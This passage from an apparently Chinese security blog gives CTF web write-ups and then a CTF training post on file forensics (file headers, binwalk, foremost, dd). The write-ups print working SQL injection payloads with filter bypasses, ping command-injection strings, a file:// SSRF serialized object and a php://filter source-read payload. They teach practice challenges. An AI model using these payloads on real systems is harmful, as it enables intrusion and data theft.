class="line">        &#125;</span><br><span class="line">        curl_close($ch);	&#x2F;&#x2F; 关闭一个curl会话，唯一的参数是curl_init()函数返回的句柄</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog &#x3D; $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>审计源码发现get()函数存在SSRF(服务端请求伪造)漏洞</p>
<p>这里先随便注册个用户登录</p>
<p>登录后发现有?no=1，第一反应就是注入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622224044845.png" alt="image-20200622224044845"></p>
<p>先测试报错，看看有没有注入，加入单引号报错，说明有注入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622224125099.png" alt="image-20200622224125099"></p>
<p>查看注入点，注意这里只是用单引号看看会不会报错，但是注入的时候是不加单引号的，使用<code>order by 5</code>发现没有5这个字段，然后尝试4</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622224434281.png" alt="image-20200622224434281"></p>
<p><code>order by 4</code>发现页面返回正常，说明注入字段是4，然后经过测试union select被过滤了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622224915250.png" alt="image-20200622224915250"></p>
<p>然后因为页面报错，我们使用报错注入试试，因为反正知道了注入点有四个，基本上都是后两个，尝试一下就行</p>
<p>payload:<code>?no=1 and updatexml(1,concat(3,&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)</code></p>
<p>页面返回了users，当前数据库是users，在查看表</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622225025442.png" alt="image-20200622225025442"></p>
<p>查看表</p>
<p>payload：<code>?no=1 and updatexml(1,concat(3,&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)),1)</code></p>
<p>返回了以下数据，因为不知道flag在哪，挨个查看一下吧，还是先查看username和passwd</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622225417922.png" alt="image-20200622225417922"></p>
<p>着了查其他的都查看了，有用的数据在data，这里查看data数据</p>
<p>payload：<code>?no=1 and updatexml(1,concat(3,&#39;~&#39;,(select group_concat(data</code></p>
<p><code>) from users)),1)</code></p>
<p>页面返回了一个序列化格式这个正是跟.apk里面的内容一样</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623110847751.png" alt="image-20200623110847751"></p>
<p>选取.apk中有用的数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name &#x3D; &quot;1&quot;;</span><br><span class="line">    public $age &#x3D; 0;</span><br><span class="line">    public $blog &#x3D; &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name &#x3D; $name;</span><br><span class="line">        $this-&gt;age &#x3D; (int)$age;</span><br><span class="line">        $this-&gt;blog &#x3D; $blog;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**&#x2F;union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>

<p>发现页面并没有回显，查看源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623121553540.png" alt="image-20200623121553540"></p>
<p>在iframe标签中可以看到flag，复制提交就可以</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623121724839.png" alt="image-20200623121724839"></p>
<h3 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h3><p>打开页面</p>
<p>可以看到，是一个ping地址的，这里就可以第一时间想到127.0.0.1;ls 或者将分号改为|管道命令，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623145137116.png" alt="image-20200623145137116"></p>
<p>使用<code>127.0.0.1;ls</code>，发现页面返回index.php，说明命令有效，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623145521140.png" alt="image-20200623145521140"></p>
<p>使用cat查看flag看看，经过测试<code>127.0.0.1;cat flag.php</code>和<code>127.0.0.1;cat flag.txt</code>都没有，这里在尝试<code>127.0.0.1;cat 、flag</code>发现成功返回了flag，复制提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623145715604.png" alt="image-20200623145715604"></p>
<h3 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h3><p>不会，</p>
<h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h3><p>查看页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704151332056.png" alt="image-20200704151332056"></p>
<p>使用admin，admin看看能不能登录上</p>
<p>页面返回用户名密码错误，而且可以看到输入的内容在url中显示，在结合题目，尝试一下有没有sql注入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704151616984.png" alt="image-20200704151616984"></p>
<p>使用万能单引号，可以看到页面返回了错误，说明存在sql注入，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704151737736.png" alt="image-20200704151737736"></p>
<p>使用注释符看看页面能否返回正常，这里使用#号–号都被注释了不能使用，%23可以使用</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704151828372.png" alt="image-20200704151828372"></p>
<p>进行注入测试，查看注入点</p>
<p>可以看到使用order by的时候or被过滤了，我们尝试一下将or双写</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152017864.png" alt="image-20200704152017864"></p>
<p>可以看到虽然双写绕过了但是还是报错不能查看注入点，使用联合查看，测试注入点</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152112746.png" alt="image-20200704152112746"></p>
<p>发现页面将union select给过滤了，我们继续进行双写</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152205359.png" alt="image-20200704152205359"></p>
<p>可以看到双写可以绕过，页面返回了不同列数，说明当前列数不对</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152322218.png" alt="image-20200704152322218"></p>
<p>经过测试发现当列数时3的时候页面返回正常，这样知道了注入点就可以进行注入了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152456577.png" alt="image-20200704152456577"></p>
<p>查看当前数据库</p>
<p>payload：<code>?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,database()%23</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152543535.png" alt="image-20200704152543535"></p>
<p>知道数据库了查看表名，可以看到报错了，在information的地方，但是or已经双写了，所以猜测将from给过滤了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152706908.png" alt="image-20200704152706908"></p>
<p>将from进行双写，双写后发现还报错了，这次报错位置在=等于号前，因为前面的table和schema都没有过滤，所以确定where过滤了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152820412.png" alt="image-20200704152820412"></p>
<p>再次将where双写试试，这次终于成功的返回了表名，’b4bsql,geekuser’</p>
<p>payload：<code>?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(table_name)frfromom infoorrmation_schema.tables whwhereere</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152946936.png" alt="image-20200704152946936"></p>
<p>知道表名了，查看字段，测试一下b4bsql表</p>
<p>payload：<code>?username=admin
&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(column_name)frfromom infoorrmation_schema.columns whwhereere table_name=&#39;b4bsql&#39;%23</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704153426029.png" alt="image-20200704153426029"></p>
<p>查看username字段的内容，可以看到有一个flag的用户名，我们查看一下密码，看看该用户名对应的是不是falg信息</p>
<p>payload：<code>?username=admin
&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(username)frfromom b4bsql%23</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704153518638.png" alt="image-20200704153518638"></p>
<p>发现成功返回了flag，如果现实不全可以查看源码进行复制</p>
<p>payload：<code>?username=admin
&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(password)frfromom b4bsql%23</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704153720139.png" alt="image-20200704153720139"></p>
<h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><p>查看页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704162008606.png" alt="image-20200704162008606"></p>
<p><strong>第一个绕过</strong></p>
<p><code>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))</code></p>
<p>需要让$text输入 ”welcome to the zjctf“ 传入文件中才能进行后面的步骤， 这里可以用php://input伪协议在以POST形式传入“ welcome to the zjctf “  也可以用data伪协议传参</p>
<p>payload：<code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></p>
<p>当页面返回这个的时候就说明正确</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704203423964.png" alt="image-20200704203423964"></p>
<p><strong>第二个绕过</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;</span><br><span class="line">    echo &quot;Not now!&quot;;</span><br><span class="line">    exit(); </span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    include($file); &#x2F;&#x2F;useless.php</span><br><span class="line">    $password &#x3D; unserialize($password);</span><br><span class="line">    echo $password;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有file参数可控，但是无法直接读取flag，可以直接读取/etc/passwd，但针对php文件我们需要进行base64编码，否则读取不到其内容，所以以下无法使用：</p>
<p><code>?file=useless.php</code></p>
<p>所以下面采用filter来读源码，但上面提到过针对php文件需要base64编码，所以使用其自带的base64过滤器。</p>
<p><code>file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
<p>跟第一个绕过放一起就是</p>
<p>payload：<code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
<p>使用base64在线解码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704204528471.png" alt="image-20200704204528471"></p>
<p>解码之后得到以下值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  &#x2F;&#x2F;flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>构造序列化</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class Flag&#123;  </span><br><span class="line">    public $file&#x3D;&quot;flag.php&quot;;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new Flag();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;  </span><br><span class="line"></span><br><span class="line">输出 O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>构造最后payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>页面返回这个</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704205638988.png" alt="image-20200704205638988"></p>
<p>按F12在源码中</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704205709535.png" alt="image-20200704205709535"></p>
]]></content>
  </entry>
  <entry>
    <title>CTF赛前培训____杂项</title>
    <url>/2020/07/25/CTF%E8%B5%9B%E5%89%8D%E5%9F%B9%E8%AE%AD____%E6%9D%82%E9%A1%B9/</url>
    <content><![CDATA[<h4 id="信息安全"><a href="#信息安全" class="headerlink" title="信息安全"></a>信息安全</h4><p>信息安全介绍</p>
<p><img src="/2020/07/25/CTF%E8%B5%9B%E5%89%8D%E5%9F%B9%E8%AE%AD____%E6%9D%82%E9%A1%B9/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200529075332068.png" alt="image-20200529075332068"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200529182253678.png" alt="image-20200529182253678"></p>
<h5 id="CTF的目标是什么"><a href="#CTF的目标是什么" class="headerlink" title="CTF的目标是什么"></a>CTF的目标是什么</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200529182740768.png" alt="image-20200529182740768"></p>
<h5 id="CTF比赛形式"><a href="#CTF比赛形式" class="headerlink" title="CTF比赛形式"></a>CTF比赛形式</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200529183542305.png" alt="image-20200529183542305"></p>
<h5 id="CTF解题模式的题目类型"><a href="#CTF解题模式的题目类型" class="headerlink" title="CTF解题模式的题目类型"></a>CTF解题模式的题目类型</h5><p><strong>1、web安全</strong>：通过浏览器访问你题目服务器上的王炸你，寻找网站漏洞（sql注入，xss文件上传，包含漏洞，xxe，ssrf，命令执行，代码审计等），利用网站漏洞获得服务器的部分或全部权限，拿到flag，通常包含分值最大的web渗透题；</p>
<p><strong>2、逆向工程（Reverse）</strong>：题目就是一个软件，但通常没有软件的源代码；需要利用工具对软件进行反编译甚至反汇编，从而理解软件内部逻辑和原理，找出flag计算相关的算法并破解这个算法，获取flag</p>
<p><strong>3、漏洞挖掘与漏洞利用（PWN,EXPLOIT）</strong>：访问一个本地或远程的二进制服务程序，通过逆向工程找出程序存在的漏洞，并利用程序中的漏洞获取远程服务器的部分或全部权限，拿到flag；</p>
<p><strong>4、密码学（Crypto）</strong>：分析提米中的密码算法与协议，利用算法或协议的弱点来计算秘钥或对密文进行解密，从而获取flag。</p>
<p>对密码方式进行解码，比如：base64，或者一些加密算法。</p>
<p>加密算法：凯撒密码等等</p>
<p>摘要算法：MD5、SHA1等等，合起来就是密码学</p>
<p><strong>5、调查取证（Misc）</strong>：也可以称为<strong>杂项</strong>。。。利用隐写术等保护技术将信息隐藏在图像、音频、视频、压缩包中，或者信息就在一段内存镜像或网络流量中，尝试将隐藏的信息恢复出来即可获得flag</p>
<p><strong>6、移动安全（Mobile）</strong>：对安卓和IOS系统的理解，逆向工程等知识。</p>
<p>难度排序从上往下：</p>
<p>①   杂项（Misc）</p>
<p>②   密码学（Crypto）</p>
<p>③   web安全</p>
<p>④   逆向（Reverse）</p>
<p>⑤   二进制破解（PWN）</p>
<p>第一个难度最低。</p>
<h5 id="CTF攻防模式"><a href="#CTF攻防模式" class="headerlink" title="CTF攻防模式"></a>CTF攻防模式</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200529202426037.png" alt="image-20200529202426037"></p>
<h5 id="CTF备战思路"><a href="#CTF备战思路" class="headerlink" title="CTF备战思路"></a>CTF备战思路</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200530081831066.png" alt="image-20200530081831066"></p>
<h5 id="CTF真题演练场"><a href="#CTF真题演练场" class="headerlink" title="CTF真题演练场"></a>CTF真题演练场</h5><p>hackingLab实验室：<a href="http://hackinglab.cn" target="_blank" rel="noopener">http://hackinglab.cn</a></p>
<p>实验吧：<a href="http://www.shiyanbar.com/ctf/practice" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/practice</a></p>
<p>i春秋CTF大本营：<a href="https://www.ichunqiu.com/competition" target="_blank" rel="noopener">https://www.ichunqiu.com/competition</a></p>
<p>合天实验室：<a href="http://www.hetianlab.com" target="_blank" rel="noopener">www.hetianlab.com</a></p>
<p>UssLab Jarvis OJ Platform：<a href="https://www.jarvisoj.com" target="_blank" rel="noopener">https://www.jarvisoj.com</a></p>
<p>XCTF实训平台：<a href="http://oj.xctf.org.cn" target="_blank" rel="noopener">http://oj.xctf.org.cn</a></p>
<p>Capture the Flag：<a href="http://captf.com" target="_blank" rel="noopener">http://captf.com</a></p>
<p>CTF Time：<a href="https://ctftime.org" target="_blank" rel="noopener">https://ctftime.org</a></p>
<p>BugkuCTF：<a href="http://ctf.bugku.com/login" target="_blank" rel="noopener">http://ctf.bugku.com/login</a></p>
<h5 id="Hackgame"><a href="#Hackgame" class="headerlink" title="Hackgame"></a>Hackgame</h5><p>SQL注入练习：<a href="http://redtiger.labs.overthewire.org" target="_blank" rel="noopener">http://redtiger.labs.overthewire.org</a></p>
<p>Xss game：<a href="http://prompt.ml/0" target="_blank" rel="noopener">http://prompt.ml/0</a></p>
<p>XSS challenges：<a href="http://xss-quiz.int21h.jp" target="_blank" rel="noopener">http://xss-quiz.int21h.jp</a></p>
<p>红客闯关游戏：<a href="http://hkyx.myhack58.com" target="_blank" rel="noopener">http://hkyx.myhack58.com</a></p>
<p>梦之光芒Hack游戏：<a href="http://monyer.com/game" target="_blank" rel="noopener">http://monyer.com/game</a></p>
<h5 id="CTF-Writeup"><a href="#CTF-Writeup" class="headerlink" title="CTF-Writeup"></a>CTF-Writeup</h5><p>实验吧Writeup：<a href="http://hebin.me" target="_blank" rel="noopener">http://hebin.me</a></p>
<p>360播报：<a href="http://bobao.360.cn/ctf" target="_blank" rel="noopener">http://bobao.360.cn/ctf</a></p>
<p>安全脉搏：<a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup" target="_blank" rel="noopener">https://www.secpulse.com/archives/category/exclusive/ctf-writeup</a></p>
<p>github上的writeup：</p>
<p><a href="https://github.com/ctfs" target="_blank" rel="noopener">https://github.com/ctfs</a></p>
<p><a href="https://github.com/VulnHub/ctf-writeups" target="_blank" rel="noopener">https://github.com/VulnHub/ctf-writeups</a></p>
<h4 id="文件操作与隐写"><a href="#文件操作与隐写" class="headerlink" title="文件操作与隐写"></a>文件操作与隐写</h4><h5 id="文件类型识别"><a href="#文件类型识别" class="headerlink" title="文件类型识别"></a>文件类型识别</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200530174356083.png" alt="image-20200530174356083"></p>
<h5 id="常见的文件头类型"><a href="#常见的文件头类型" class="headerlink" title="常见的文件头类型"></a>常见的文件头类型</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200530200204759.png" alt="image-20200530200204759"></p>
<p>每个文件类型的文件头是不同的。</p>
<p>可以使用文本软件来查看16进制，看看是否与文件头对应</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200530202142688.png" alt="image-20200530202142688"></p>
<h5 id="文件头残缺-错误"><a href="#文件头残缺-错误" class="headerlink" title="文件头残缺/错误"></a>文件头残缺/错误</h5><p>​        通常文件无法正常打开有两种情况，一种是文件头部残缺，另一种是文件头部字段错误。winhex程序添加相应的文件头，针对头部字段错误，可以找一个相同类型的文件进行替换。</p>
<p>格式：file 文件名</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200530203703413.png" alt="image-20200530203703413"></p>
<p>如果文件头确实或者错误，我们就要进行修复</p>
<p>当文件查看不了的时候显示这是一个data文件，告诉你这就是一串数据，它也不知道这是什么类型的文件，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200530204639638.png" alt="image-20200530204639638"></p>
<p>如果缺失了，可以用notpad++进行修改16进制，将正确的文件头输入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200530210037447.png" alt="image-20200530210037447"></p>
<h5 id="文件分离操作"><a href="#文件分离操作" class="headerlink" title="文件分离操作"></a>文件分离操作</h5><h5 id="1、Binwalk"><a href="#1、Binwalk" class="headerlink" title="1、Binwalk"></a>1、Binwalk</h5><p>​    Binwalk是linux下用来分析和分离文件的工具，可以快速分辨文件是否由多个文件合并而成，并将文件进行分离，如果分离成功会在目标文件的目录</p>
<p>同目录下生成一个形如_ 文件名 _extracted的文件目录，目录中有分离后的文件</p>
<p>用法：</p>
<p>分析文件：<code>binwalk filename</code></p>
<p>分离文件：<code>binwalk -e filename</code></p>
<p>binwalk是linux下的一款工具。当你拿到一个文件的时候如果图片中没有任何隐藏文件那就会返回文件格式如果文件中隐藏了文件，使用binwalk的时候就会返回隐藏的文件</p>
<p>这个图片是里面没有任何隐藏的文件所以只返回了文件格式</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531090736137.png" alt="image-20200531090736137"></p>
<p>如果是图片中隐藏了内容的话，会分析出其中的内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531090846805.png" alt="image-20200531090846805"></p>
<p>可以看到第二行的 0x596F后面是ZIP所以需要使用<code>binwalk -e 文件名</code>   来讲文件中的内容分离出来，可以看到这样就多出来一个文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531091238559.png" alt="image-20200531091238559"></p>
<p>打开文件原图片的文件可以看到多了一个文件夹</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531091335384.png" alt="image-20200531091335384"></p>
<p>打开这个文件夹发现里面还有一个压缩包和一个key.txt的文件，这个key.txt就是压缩包中的 文件，因为binwalk会自动将压缩包进行解压</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531091544496.png" alt="image-20200531091544496"></p>
<h5 id="2、foremost"><a href="#2、foremost" class="headerlink" title="2、foremost"></a>2、foremost</h5><p>还有一种就是，比如binwalk不能使用了，无法进行分离，</p>
<p>可以使用<code>foremost 文件名 -o 自定义文件名</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531094100756.png" alt="image-20200531094100756"></p>
<p>foremost并不能像binwalk一样进行压缩包解压，他会详细的将文件分类，jpg就在jpg文件夹中，压缩包就在zip文件夹中，而且还会生成一个日志</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531094114315.png" alt="image-20200531094114315"></p>
<p>要获取flag文件就要自行将zip进行解压。获取key值</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531094816974.png" alt="image-20200531094816974"></p>
<h5 id="3、dd"><a href="#3、dd" class="headerlink" title="3、dd"></a>3、dd</h5><p>​    当文件自动分离出错或者因为其他原因无法自动分离时，可以使用dd实现文件手动分离。</p>
<p>格式：</p>
<p><code>dd if=源文件 of=目标文件名 bs=1 skip= 开始分离的字节数</code></p>
<p>参数说明：</p>
<p><code>if=file            #输入文件名，缺省为标准输入</code></p>
<p><code>of=file         #输出文件名，缺省为标准输出。</code></p>
<p><code>bs=bytes        #同时设置读写块的大小为bytes，可代替ibs和obs。</code></p>
<p><code>skip=blocks    #从输入文件开头跳过blocks个块后再开始复制</code></p>
<p>小例子：</p>
<p>这里的<code>bs=5</code>和<code>count=1</code>的意思就是将前面5个数保存到2.txt，剩下的去掉</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531100643431.png" alt="image-20200531100643431"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531102208822.png" alt="image-20200531102208822"></p>
<p>skip的意思就是跳过多少块，因为设置的bs是5也就是前5个数，然后skip跳过第一块，就将1-5跳过了。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531102310903.png" alt="image-20200531102310903"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531105530101.png" alt="image-20200531105530101"></p>
<h5 id="4、手动"><a href="#4、手动" class="headerlink" title="4、手动"></a>4、手动</h5><p>除了使用dd外，还可以手进行文件分离，将目标文件放到Notepad++中打开后是乱码这是正常的，点开里面的插件选择HEX-Editor插件将其转换成16进制，找出分离的16进制，复制出来，将文件格式改为zip</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531160514147.png" alt="image-20200531160514147"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531161047702.png" alt="image-20200531161047702"></p>
<h5 id="5、010Editor"><a href="#5、010Editor" class="headerlink" title="5、010Editor"></a>5、010Editor</h5><p>将16进制字符文件导入保存操作：</p>
<p>比如获得一个文件将其打开发现是16进制的，这就说明让其把16进制变成一个压缩包</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531164853335.png" alt="image-20200531164853335"></p>
<p>使用010 Editor导入这个文件其实在这就能看到他是一个Rar文件，这样我们就进行另存为将其存为Rar文件。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531165346523.png" alt="image-20200531165346523"></p>
<p>发现桌面已经确实存为了rar后缀的压缩包</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531170000062.png" alt="image-20200531170000062"></p>
<h4 id="文件合并"><a href="#文件合并" class="headerlink" title="文件合并"></a>文件合并</h4><h5 id="1、Linux下文件合并"><a href="#1、Linux下文件合并" class="headerlink" title="1、Linux下文件合并"></a>1、Linux下文件合并</h5><p>linux下，通常对文件名相似的文件要进行批量合并</p>
<p>格式：<code>cat 合并的文件 &gt; 输出的文件</code></p>
<p>这两种方法都可以，*代表了多个</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531170822455.png" alt="image-20200531170822455"></p>
<p>完整性检测：linux下计算文件md5</p>
<p>格式：md5sum 文件名</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531171058683.png" alt="image-20200531171058683"></p>
<h5 id="2、Windows下的文件合并"><a href="#2、Windows下的文件合并" class="headerlink" title="2、Windows下的文件合并"></a>2、Windows下的文件合并</h5><p>Windows下，通常需要对文件名相似的文件进行批量合并</p>
<p>格式：copy /B 合并的文件输出的文件命令</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531171248575.png" alt="image-20200531171248575"></p>
<p>完整性检测：windows下计算文件md5：</p>
<p>格式：<code>certutil -hashfile 文件名 md5</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200531171356277.png" alt="image-20200531171356277"></p>
<h4 id="文件内容隐写"><a href="#文件内容隐写" class="headerlink" title="文件内容隐写"></a>文件内容隐写</h4><p>文件内容隐写，就是直接将KEY以十六进制的形式卸载文件中，通常在文件的开头或结尾部分，<strong>分析时通常重点观察文件开头和结尾部分</strong>。如果在文件中间部分，通常<strong>搜索关键字KEY或者flag来查找隐藏内容（每个工具都有查找功能使用查找功能进行查找）。</strong></p>
<p>Windows下，搜索隐写的文件内容</p>
<h5 id="1、Winhex-010Eidtor"><a href="#1、Winhex-010Eidtor" class="headerlink" title="1、Winhex / 010Eidtor"></a>1、Winhex / 010Eidtor</h5><p>​    将要识别的文件拖入010Eidtor(十六进制)，查找具有关键字或明显与文件内容不和谐的部分，通常优先观察文件首部和尾部，搜索flag或key等关键字，最后拖动滚轮寻找。</p>
<h5 id="2、Notepad"><a href="#2、Notepad" class="headerlink" title="2、Notepad++"></a>2、Notepad++</h5><p>​    使用notepad++打开文件，查看文件头尾是否有含有关键字的字符串，搜索flag或key等关键字，最后拖动滚轮寻找。</p>
